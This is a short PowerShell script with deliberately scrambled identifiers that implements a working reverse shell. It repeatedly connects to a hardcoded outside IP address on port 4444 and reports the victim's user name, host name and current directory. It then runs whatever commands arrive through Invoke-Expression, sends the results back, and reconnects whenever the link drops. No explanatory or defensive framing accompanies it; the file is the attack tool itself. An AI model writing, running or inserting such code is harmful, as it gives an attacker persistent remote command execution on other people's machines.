class YUCRMycQDRI {
    
    [string]$yzbuWKjhWlP = "93.49.240.195"
    [int]$oYtJDeePLppV = 4444

    $OknlJzqPcAvFXIGsvSdtpY
    $xMAeROH
    $wMyXRaYjmwzsbi
    $WwaFjpJzFvmJLccBobNEQQSw
    $JUsJJpufBTDkpPOEaIXIZkPe
    $pfQGagUtXEF
    [int]$NYbAsUSue = 50*1024

    eGlLdygmzXogZIdhE() {
        $this.xMAeROH = $false
        while ($true) {
            try {
                $this.xMAeROH = New-Object Net.Sockets.TcpClient($this.yzbuWKjhWlP, $this.oYtJDeePLppV)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.SyhIGjROBWKRqjiQGXwS()
    }

    SyhIGjROBWKRqjiQGXwS() {
        $this.OknlJzqPcAvFXIGsvSdtpY = $this.xMAeROH.GetStream()
        $this.WwaFjpJzFvmJLccBobNEQQSw = New-Object Byte[] $this.NYbAsUSue
        $this.pfQGagUtXEF = New-Object Text.UTF8Encoding
        $this.wMyXRaYjmwzsbi = New-Object IO.StreamWriter($this.OknlJzqPcAvFXIGsvSdtpY, [Text.Encoding]::UTF8, $this.NYbAsUSue)
        $this.JUsJJpufBTDkpPOEaIXIZkPe = New-Object System.IO.StreamReader($this.OknlJzqPcAvFXIGsvSdtpY)
        $this.wMyXRaYjmwzsbi.AutoFlush = $true
    }

    HxRUnqQZswF() {
        $this.eGlLdygmzXogZIdhE()
        $this.ZdQfSBUpFGmHeFsoIFo()
    }

    WHKMoPjnkXi($HtSMLYkXOaXGR) {
        try {
            [byte[]]$nRdcpwWDTnyIlljkiE = [text.Encoding]::Ascii.GetBytes($HtSMLYkXOaXGR)
            $this.wMyXRaYjmwzsbi.Write($nRdcpwWDTnyIlljkiE, 0, $nRdcpwWDTnyIlljkiE.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.HxRUnqQZswF()
        }
    }

    [string] GAwUfZjEbk() {
        try {
            $szgexyyXlspss = $this.OknlJzqPcAvFXIGsvSdtpY.Read($this.WwaFjpJzFvmJLccBobNEQQSw, 0, $this.NYbAsUSue)    
            $GhDbZDNgsMR = ($this.pfQGagUtXEF.GetString($this.WwaFjpJzFvmJLccBobNEQQSw, 0, $szgexyyXlspss))
            return $GhDbZDNgsMR
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.HxRUnqQZswF()
            return ""
        }
    }

    [string] plIzFWddj($OXdPoBmUrkFZNSgEgRkUk) {
        Write-Host $OXdPoBmUrkFZNSgEgRkUk
        try { 
            $DqzqugXbTl = Invoke-Expression $OXdPoBmUrkFZNSgEgRkUk | Out-String
        }
        catch {
            $QiqBSi = $_.Exception
            $pbzTjXTUYOzMNjd = $_.Message
            $DqzqugXbTl = "`n$_`n"
        }
        return $DqzqugXbTl
    }

    [string] VmSORKnDzUO() {
        $ZPEDKRnqMiPtnp = [Environment]::UserName
        $RACZl = [System.Net.Dns]::GetHostName()
        $HHxLxbGxMdbnHPhIdSTQqZK = Get-Location
        return "$ZPEDKRnqMiPtnp@$RACZl [$HHxLxbGxMdbnHPhIdSTQqZK]~$ "
    }

    ZdQfSBUpFGmHeFsoIFo() {
        while ($this.xMAeROH.Connected) {
            $this.WHKMoPjnkXi($this.VmSORKnDzUO())         
            $GhDbZDNgsMR = $this.GAwUfZjEbk()
            $DqzqugXbTl = "`n"
            if ([string]::IsNullOrEmpty($GhDbZDNgsMR)) {
                continue
            }
            $DqzqugXbTl = $this.plIzFWddj($GhDbZDNgsMR)
            $this.WHKMoPjnkXi($DqzqugXbTl + "`n")
            $this.OknlJzqPcAvFXIGsvSdtpY.Flush()
        }
        $this.xMAeROH.Close()
        $this.HxRUnqQZswF()
    } 
}

$jcptSZfqOsgiEArXCeIXssNg = [YUCRMycQDRI]::new()
$jcptSZfqOsgiEArXCeIXssNg.HxRUnqQZswF()
